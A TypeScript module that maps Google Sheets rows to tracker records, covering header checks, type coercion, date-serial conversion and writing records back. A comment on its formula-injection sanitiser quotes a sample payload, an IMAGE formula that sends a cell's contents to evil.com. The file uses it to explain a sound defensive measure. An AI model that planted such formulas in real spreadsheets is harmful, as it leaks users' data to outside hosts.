/**
 * The Sheet ↔ object boundary: header mapping, type coercion, and the one
 * place that converts Google's date serial numbers.
 *
 * Row 1 of every entity tab is a contract. It is resolved once per load and
 * everything downstream depends on it, so a mismatch fails with an instruction
 * rather than a TypeError three frames deep.
 *
 * Every function here takes its entity explicitly. Nothing in this file knows
 * which tab it is working on.
 */

import { HOUSEKEEPING_COLUMNS, expectedHeaders, type EntitySchema, type Field } from '../config/schema'

export type CellValue = string | number | boolean | null

export interface TrackerRecord {
  id: string
  createdAt: string
  createdBy: string
  updatedAt: string
  updatedBy: string
  deleted: boolean
  /** Domain values, keyed by field key from schema.ts. */
  fields: Record<string, CellValue>
}

export class HeaderContractError extends Error {
  constructor(
    readonly missing: string[],
    readonly sheetName: string,
  ) {
    super(
      missing.length === 1
        ? `Sheet is missing column \`${missing[0]}\` — add it to row 1 of the ${sheetName} tab`
        : `Sheet is missing columns ${missing.map((m) => `\`${m}\``).join(', ')} — add them to row 1 of the ${sheetName} tab`,
    )
    this.name = 'HeaderContractError'
  }
}

// ---------------------------------------------------------------------------
// Dates
//
// Google stores dates as serial numbers: whole days since 1899-12-30. Reading
// with UNFORMATTED_VALUE (which we need for clean numbers and booleans) means
// dates arrive as numbers, so this conversion is unavoidable.
//
// Everything here is UTC-only on purpose. Using local time would shift dates
// across midnight for anyone east or west of the sheet's timezone — the classic
// "my due date moved by a day" bug.
// ---------------------------------------------------------------------------

/** 1899-12-30T00:00:00Z, the origin of Google's date serials. */
const SERIAL_EPOCH_MS = Date.UTC(1899, 11, 30)
const MS_PER_DAY = 86_400_000

export function serialToIso(serial: number): string | null {
  if (!Number.isFinite(serial)) return null
  // Round rather than truncate: a serial carrying a time component (or a float
  // rounding artefact like 46247.999999) must still land on the right day.
  const days = Math.round(serial)
  const iso = new Date(SERIAL_EPOCH_MS + days * MS_PER_DAY).toISOString()
  return iso.slice(0, 10)
}

export function isoToSerial(iso: string): number | null {
  const match = /^(\d{4})-(\d{2})-(\d{2})$/.exec(iso.trim())
  if (!match) return null
  const [, year, month, day] = match
  const ms = Date.UTC(Number(year), Number(month) - 1, Number(day))
  if (!Number.isFinite(ms)) return null
  return Math.round((ms - SERIAL_EPOCH_MS) / MS_PER_DAY)
}

// ---------------------------------------------------------------------------
// Headers
// ---------------------------------------------------------------------------

export type HeaderIndex = Map<string, number>

/**
 * Maps each expected column name to its position in row 1. Positions are read
 * from the sheet rather than assumed, so re-ordering columns by hand is safe —
 * only renaming or deleting one breaks the contract.
 */
export function indexHeaders(headerRow: readonly unknown[], entity: EntitySchema): HeaderIndex {
  const index: HeaderIndex = new Map()
  headerRow.forEach((cell, position) => {
    const name = String(cell ?? '').trim()
    if (name && !index.has(name)) index.set(name, position)
  })

  const missing = expectedHeaders(entity).filter((name) => !index.has(name))
  if (missing.length > 0) throw new HeaderContractError(missing, entity.sheetName)

  return index
}

// ---------------------------------------------------------------------------
// Coercion
// ---------------------------------------------------------------------------

function isBlank(value: unknown): boolean {
  return value === undefined || value === null || value === ''
}

function toText(value: unknown): string {
  return isBlank(value) ? '' : String(value)
}

function toBoolean(value: unknown): boolean {
  if (typeof value === 'boolean') return value
  const text = String(value ?? '').trim().toLowerCase()
  return text === 'true' || text === 'yes' || text === '1'
}

/**
 * Coerce one cell according to its schema type.
 *
 * Anyone can type anything into any cell of a Google Sheet, so this never
 * throws: a bad value comes back as the raw text and the table shows it as-is.
 * A tracker that white-screens because one cell is untidy will not be trusted.
 *
 * `reference` and `link` fall through to text on purpose. Both hold opaque
 * identifiers — a slug like `retail-banking`, a UUID — and neither must ever be
 * coerced to a number, however numeric it happens to look. The switch is on the
 * field's declared type, not on the shape of the value, which is what
 * guarantees that.
 */
export function coerceCell(value: unknown, field: Field): CellValue {
  if (isBlank(value)) return null

  switch (field.type) {
    case 'number': {
      const n = typeof value === 'number' ? value : Number(String(value).trim())
      return Number.isFinite(n) ? n : toText(value)
    }
    case 'date': {
      if (typeof value === 'number') return serialToIso(value) ?? toText(value)
      // Already-text dates happen when a column loses its date formatting. They
      // are kept verbatim either way: a well-formed one is already ISO, and a
      // malformed one must survive to be visible and fixable rather than be
      // silently blanked.
      return toText(value).trim()
    }
    default:
      return toText(value)
  }
}

// ---------------------------------------------------------------------------
// Rows → records
// ---------------------------------------------------------------------------

function cell(row: readonly unknown[], index: HeaderIndex, column: string): unknown {
  const position = index.get(column)
  return position === undefined ? undefined : row[position]
}

export function rowToRecord(
  row: readonly unknown[],
  index: HeaderIndex,
  entity: EntitySchema,
): TrackerRecord {
  const fields: Record<string, CellValue> = {}
  for (const field of entity.fields) {
    fields[field.key] = coerceCell(cell(row, index, field.key), field)
  }

  return {
    id: toText(cell(row, index, 'id')),
    createdAt: toText(cell(row, index, 'createdAt')),
    createdBy: toText(cell(row, index, 'createdBy')),
    updatedAt: toText(cell(row, index, 'updatedAt')),
    updatedBy: toText(cell(row, index, 'updatedBy')),
    deleted: toBoolean(cell(row, index, 'deleted')),
    fields,
  }
}

/** Exposed for the setup script's benefit and for error messages. */
export function columnsFor(entity: EntitySchema): string[] {
  return [...HOUSEKEEPING_COLUMNS, ...entity.fields.map((f) => f.key)]
}

// ---------------------------------------------------------------------------
// Records → rows (the write direction)
// ---------------------------------------------------------------------------

/** 0 → A, 25 → Z, 26 → AA. */
export function columnLetter(index: number): string {
  let n = index
  let letters = ''
  do {
    letters = String.fromCharCode(65 + (n % 26)) + letters
    n = Math.floor(n / 26) - 1
  } while (n >= 0)
  return letters
}

/**
 * Neutralise spreadsheet formula injection.
 *
 * Values are written with USER_ENTERED (required for real date and number
 * cells), which means a value starting with `=` becomes a LIVE FORMULA.
 * `=IMAGE("https://evil.com/?d="&A2)` would make the spreadsheet fetch that URL
 * and leak the cell's contents — a genuine exfiltration path via IMAGE,
 * IMPORTDATA, IMPORTRANGE and HYPERLINK, not merely a display bug.
 *
 * A leading apostrophe makes Sheets store the value as literal text. The
 * apostrophe is a display marker only: it is NOT returned by the API on read,
 * so round-trips stay clean.
 */
export function sanitizeText(value: string): string {
  return /^[=+\-@]/.test(value) ? `'${value}` : value
}

export interface RecordWrite {
  id: string
  createdAt: string
  createdBy: string
  updatedAt: string
  updatedBy: string
  deleted: boolean
  fields: Record<string, CellValue>
}

/**
 * Build a sheet row, positioning every value by the header index so that
 * hand-reordered columns still land correctly.
 */
export function recordToRow(
  record: RecordWrite,
  index: HeaderIndex,
  entity: EntitySchema,
): CellValue[] {
  const width = Math.max(...index.values()) + 1
  const row: CellValue[] = new Array<CellValue>(width).fill('')

  const put = (column: string, value: CellValue) => {
    const position = index.get(column)
    if (position !== undefined) row[position] = value
  }

  put('id', record.id)
  put('createdAt', record.createdAt)
  put('createdBy', record.createdBy)
  put('updatedAt', record.updatedAt)
  put('updatedBy', record.updatedBy)
  put('deleted', record.deleted)

  for (const field of entity.fields) {
    put(field.key, toCell(record.fields[field.key] ?? null, field))
  }

  return row
}

function toCell(value: CellValue, field: Field): CellValue {
  if (value === null || value === '') return ''

  switch (field.type) {
    case 'number': {
      const n = typeof value === 'number' ? value : Number(String(value).trim())
      return Number.isFinite(n) ? n : sanitizeText(String(value))
    }
    case 'date': {
      // Write the serial number, not the ISO text. USER_ENTERED would have to
      // parse "2026-08-14" according to the sheet's locale; a serial is
      // unambiguous, and column formatting renders it as a date.
      const serial = isoToSerial(String(value))
      return serial ?? sanitizeText(String(value))
    }
    default:
      return sanitizeText(String(value))
  }
}
